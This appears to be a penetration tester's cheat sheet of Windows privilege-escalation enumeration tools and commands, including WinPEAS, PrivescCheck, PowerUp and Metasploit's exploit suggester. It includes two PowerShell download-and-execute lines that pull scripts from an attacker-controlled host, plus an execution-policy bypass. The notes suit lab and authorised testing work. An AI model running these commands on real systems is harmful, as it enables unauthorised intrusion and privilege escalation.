# Automation

### 1: WinPEAS  Author:https://github.com/carlospolop/PEASS-ng/releases

### 2: Privesccheck (Set -ExecutionPolicy Bypass -Scope process -Force) Author: https://github.com/itm4n/PrivescCheck

### 3: Windows Exploit Suggester - Next Generation (WES-NG) Author: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

### Systeminfo > txt file

### wes.py --update

### 4: Metasploit (multi/recon/local_exploit_suggester)

### 5: PowerSharpPack https://github.com/S3cur3Th1sSh1t/PowerSharpPack

    iex(new-object net.webclient).downloadstring('http://ATTACK_IP:PORT/PowerSharpPack.ps1')

### Then

    PowerSharpPack -winPEAS

### 6: Invoke-WinPEAS https://gist.github.com/S3cur3Th1sSh1t/d14c3a14517fd9fb7150f446312d93e0#file-invoke-winpeas-ps1

    iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/Invoke-winPEAS.ps1')

    Invoke-winPEAS >> .out

### 7: PowerUp

##### All checks

    Invoke-AllChecks

##### Get services with unquoted paths and a space in their name.

    Get-UnquotedService -Verbose

##### Get services where the current user can write to its binary path or change arguments to the binary

    Get-ModifiableServiceFile -Verbose

###### Get the services whose configuration current user can modify.

    Get-ModifiableService -Verbose

##### DLL Hijacking

    Find-ProcessDLLHijack
    Find-PathDLLHijack

### 8: Other

##### PrivescCheck: https://github.com/itm4n/PrivescCheck

    . .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended

    .\beRoot.exe
    .\winPEAS.exe
    .\Seatbelt.exe -group=all -full

##### Privesc: https://github.com/enjoiz/Privesc

    Invoke-PrivEsc
